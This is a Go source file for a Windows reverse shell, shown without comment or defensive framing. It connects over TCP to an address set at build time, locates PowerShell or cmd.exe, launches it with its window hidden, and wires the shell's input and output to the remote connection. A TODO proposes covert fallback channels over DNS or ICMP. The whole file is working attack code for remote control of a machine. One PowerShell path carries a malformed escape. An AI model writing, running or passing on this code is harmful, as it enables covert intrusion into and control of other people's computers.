package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"syscall"
)

var (
	// set during compilation/linking via -X ldflag
	address string
)

func findShellBinary() (string, error) {
	windir := os.Getenv("windir")
	if windir == "" {
		windir = "C:\\Windows"
	}

	windowsShellBinaryPaths := []string{
		fmt.Sprintf("%s\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", windir), // PS x64
		fmt.Sprintf("%s\\syswow64\\WindowsPowerShell\v1.0\\powershell.exe", windir),  // PS x32
		fmt.Sprintf("%s\\system32\\cmd.exe", windir),                                 // cmd
	}

	for _, binaryPath := range windowsShellBinaryPaths {
		if _, err := os.Stat(binaryPath); os.IsNotExist(err) {
			continue
		}
		return binaryPath, nil
	}
	return "", fmt.Errorf("could not find any existing shell binary")
}

func attachShell(binaryPath string, con net.Conn) error {
	var cmd *exec.Cmd
	cmd = exec.Command(binaryPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con

	err := cmd.Start()
	if err != nil {
		return fmt.Errorf("could not start shell: %v", err)
	}
	err = cmd.Wait()
	if err != nil {
		return fmt.Errorf("shell died: %v", err)
	}
	return nil
}

func main() {
	con, err := net.Dial("tcp", address)
	if err != nil {
		// TODO: report back through another channel (DNS, ICMP, ...)
		return
	}
	log.SetOutput(con)

	binaryPath, err := findShellBinary()
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("Using Shell: %s", binaryPath)

	err = attachShell(binaryPath, con)
	if err != nil {
		log.Fatal(err)
	}
}
